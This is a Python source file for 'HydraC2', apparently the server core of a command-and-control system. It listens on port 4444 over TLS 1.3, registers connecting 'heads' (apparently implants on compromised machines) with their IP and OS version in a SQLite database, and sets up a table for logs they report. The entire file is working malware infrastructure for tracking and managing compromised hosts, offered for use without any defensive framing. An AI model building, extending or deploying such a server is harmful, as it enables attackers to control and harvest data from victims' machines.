import asyncio
import ssl
import json
import os
import aiosqlite
import time

class HydraC2:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.db_path = "hydra_core.db"

    async def init_db(self):
        """Initializes the SQLite database for Hydra."""
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute('''CREATE TABLE IF NOT EXISTS heads 
                (id TEXT PRIMARY KEY, ip TEXT, os_version TEXT, last_seen INTEGER)''')
            await db.execute('''CREATE TABLE IF NOT EXISTS logs 
                (id INTEGER PRIMARY KEY AUTOINCREMENT, head_id TEXT, log_type TEXT, data TEXT, timestamp INTEGER)''')
            await db.commit()
        print("[*] Hydra Database Initialized.")

    def get_ssl_context(self):
        if not os.path.exists("hydra.crt") or not os.path.exists("hydra.key"):
            raise FileNotFoundError("Certificates missing! Run the openssl command first.")
            
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.minimum_version = ssl.TLSVersion.TLSv1_3
        context.load_cert_chain(certfile="hydra.crt", keyfile="hydra.key")
        return context

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        print(f"[+] Encrypted Head Attached: {addr}")

        try:
            while True:
                data = await reader.read(8192) # Increased buffer for bigger JSONs
                if not data: break
                
                msg = json.loads(data.decode('utf-8'))
                head_id = msg.get("head_id", "Unknown")

                # Save check-in to Database
                async with aiosqlite.connect(self.db_path) as db:
                    await db.execute("INSERT OR REPLACE INTO heads VALUES (?, ?, ?, ?)",
                                   (head_id, addr[0], msg.get("os", "N/A"), int(time.time())))
                    await db.commit()

                print(f"[*] Action from {head_id}: {msg.get('type')}")

        except Exception as e:
            print(f"[!] Error handling client {addr}: {e}")
        finally:
            writer.close()

    async def start_server(self):
        await self.init_db() # Setup DB first
        ssl_context = self.get_ssl_context()
        
        server = await asyncio.start_server(self.handle_client, self.host, self.port, ssl=ssl_context)
        print(f"[*] Hydra-C2 Core Online (TLS 1.3) on {self.host}:{self.port}")
        
        async with server:
            await server.serve_forever()

if __name__ == "__main__":
    try:
        asyncio.run(HydraC2().start_server())
    except FileNotFoundError as e:
        print(f"\n[ERROR] {e}")
        print("Run: openssl req -newkey rsa:2048 -nodes -keyout hydra.key -x509 -days 365 -out hydra.crt\n")